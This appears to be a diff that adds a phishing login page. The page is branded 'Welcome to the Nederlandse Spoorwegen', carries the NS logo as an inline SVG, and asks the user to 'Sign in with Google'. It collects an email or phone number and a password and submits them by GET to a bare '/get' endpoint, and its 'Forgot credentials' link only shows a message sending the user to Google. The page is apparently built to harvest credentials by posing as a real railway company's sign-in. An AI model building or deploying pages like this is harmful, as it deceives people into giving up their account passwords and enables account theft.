@@ -1,0 +1,156 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<style>
+body {
+  font-family: Arial, sans-serif;
+  background-color: #FFFFFF;
+}
+
+.container {
+  max-width: 400px;
+  margin: 0 auto;
+  padding: 20px;
+}
+
+@media (min-width: 600px) {
+  .container {
+    max-width: 500px;
+  }
+}
+
+.logo-container {
+  text-align: center;
+  margin-bottom: 30px;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+}
+
+.logo {
+  width: 40px;
+  height: 40px;
+  fill: #333399;
+  margin-right: 100px
+}
+
+.form-container {
+  background: #FFFFFF;
+  border: 1px solid #FFFFFF;
+  border-radius: 4px;
+  padding: 20px;
+  box-shadow: 0px 0px 10px 0px rgba(108,66,156,0.2);
+}
+
+h1 {
+  text-align: center; 
+  font-size: 28px;
+  font-weight: 500;
+  color: #000000;
+  margin-bottom: 20px;
+}
+
+
+.input-field {
+  width: 100%;
+  padding: 12px;
+  border: 2px solid #FFCD18;
+  border-radius: 4px;
+  box-sizing: border-box;
+  margin-bottom: 20px;
+  font-size: 14px;
+}
+
+.submit-btn {
+  background: #FFCD18;
+  border: none;
+  color: #FFFFFF;
+  padding: 12px 20px;
+  border-radius: 4px;
+  cursor: pointer;
+  font-size: 16px;
+  display: block;
+  margin: auto;
+}
+
+.submit-btn:hover {
+  background: #333399;
+}
+
+.forgot-password {
+  display: block;
+  text-align: center;
+  color: #000000;
+  text-decoration: underline;
+  margin-top: 10px;
+}
+
+.error-message {
+  color: red;
+  text-align: center;
+  display: none; 
+  margin-top: 10px;
+}
+
+</style>
+</head>
+
+<body>
+
+<div class="container">
+
+  <div class="logo-container">
+<svg version="1.0" xmlns="http://www.w3.org/2000/svg"
+ width="256.000000pt" height="103.000000pt" viewBox="0 0 2560.000000 1035.000000"
+ preserveAspectRatio="xMidYMid meet">
+<g transform="translate(0.000000,1035.000000) scale(0.100000,-0.100000)"
+fill="#333399" stroke="none">
+<path d="M2732 7617 l-2442 -2442 2443 -2443 2442 -2442 1390 0 1390 0 -1950
+1950 -1950 1950 2675 0 c2246 0 2686 -3 2741 -14 87 -19 180 -58 259 -111 45
+-30 541 -517 1605 -1577 895 -891 1578 -1564 1632 -1606 152 -121 308 -219
+498 -312 258 -128 494 -204 785 -253 125 -21 127 -21 3150 -24 l3025 -3 2442
+2442 2443 2443 -2442 2442 -2443 2443 -1390 0 -1390 0 1955 -1955 1955 -1955
+-2685 2 -2685 3 -80 23 c-92 26 -184 67 -252 113 -27 17 -741 723 -1588 1569
+-847 845 -1578 1568 -1625 1605 -415 330 -912 532 -1439 585 -68 7 -1109 10
+-3065 10 l-2961 0 -2443 -2443z m8311 472 c102 -16 225 -63 311 -119 59 -38
+383 -358 1567 -1545 822 -824 1537 -1533 1589 -1577 466 -392 1015 -611 1622
+-648 89 -6 1262 -10 2783 -10 l2630 0 -970 -970 -970 -970 -2530 3 c-2412 2
+-2533 3 -2590 21 -85 26 -173 67 -246 116 -43 29 -551 528 -1574 1550 -830
+828 -1537 1529 -1570 1557 -385 322 -824 528 -1325 620 l-155 28 -2780 5
+-2779 5 968 973 969 972 2489 0 c1778 0 2510 -3 2561 -11z"/>
+</g>
+</svg>
+
+
+  </div>
+
+  <div class="form-container">
+  <center><h1>Welcome to the Nederlandse Spoorwegen</h1>
+  <h2>Sign in with Google</h2>
+      </center>
+
+    <form action="/get" id="login-form">
+    
+      <input name="email" class="input-field" type="text" placeholder="Email or mobile phone number" required>
+      
+      <input name="password" class="input-field" type="password" placeholder="Password" required>
+
+      <button class="submit-btn" type="submit">Continue</button>
+	    <a href="javascript:void(0);" class="forgot-password">Forgot credentials?</a>
+	<div class="error-message"></div>
+    </form>
+
+  </div>
+
+</div>
+<script>
+  document.querySelector('.forgot-password').addEventListener('click', function() {
+    var errorMessage = document.querySelector('.error-message');
+    errorMessage.innerHTML = "Please refer to your Google account if you forgot your credentials";
+    errorMessage.style.display = 'block';
+  });
+</script>
+</meta>
+</body>
+</html>
